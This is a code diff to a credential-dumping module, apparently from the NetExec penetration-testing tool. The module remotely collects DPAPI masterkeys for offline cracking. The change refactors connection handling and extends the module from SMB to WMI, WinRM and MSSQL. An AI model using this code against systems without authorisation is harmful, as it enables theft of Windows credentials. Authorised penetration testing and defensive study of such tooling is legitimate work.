@@ -1,15 +1,13 @@
-from dploot.lib.target import Target
 from dploot.triage.masterkeys import MasterkeysTriage
-
-from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection
-
+from nxc.helpers.misc import CATEGORY
 # Based on dpapimk2john, original work by @fist0urs
 
 
 class NXCModule:
     name = "dpapi_hash"
     description = "Remotely dump Dpapi hash based on masterkeys"
-    supported_protocols = ["smb"]
+    supported_protocols = ["smb", "wmi", "winrm", "mssql"]
+    category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
         """OUTPUTFILE       Output file to write hashes"""
@@ -18,33 +16,11 @@ class NXCModule:
             self.outputfile = module_options["OUTPUTFILE"]
 
     def on_admin_login(self, context, connection):
-        username = connection.username
-        password = getattr(connection, "password", "")
-        nthash = getattr(connection, "nthash", "")
-
-        target = Target.create(
-            domain=connection.domain,
-            username=username,
-            password=password,
-            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
-            lmhash=getattr(connection, "lmhash", ""),
-            nthash=nthash,
-            do_kerberos=connection.kerberos,
-            aesKey=connection.aesKey,
-            no_pass=True,
-            use_kcache=getattr(connection, "use_kcache", False),
-        )
-
-        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
-        if conn is None:
-            context.log.debug("Could not upgrade connection")
-            return
-
         try:
             context.log.display("Collecting DPAPI masterkeys, grab a coffee and be patient...")
             masterkeys_triage = MasterkeysTriage(
-                target=target,
-                conn=conn,
+                target=connection.dpapi_triage.target,
+                conn=connection.dpapi_triage.conn,
             )
             context.log.debug(f"Masterkeys Triage: {masterkeys_triage}")
             context.log.debug("Collecting user masterkeys")
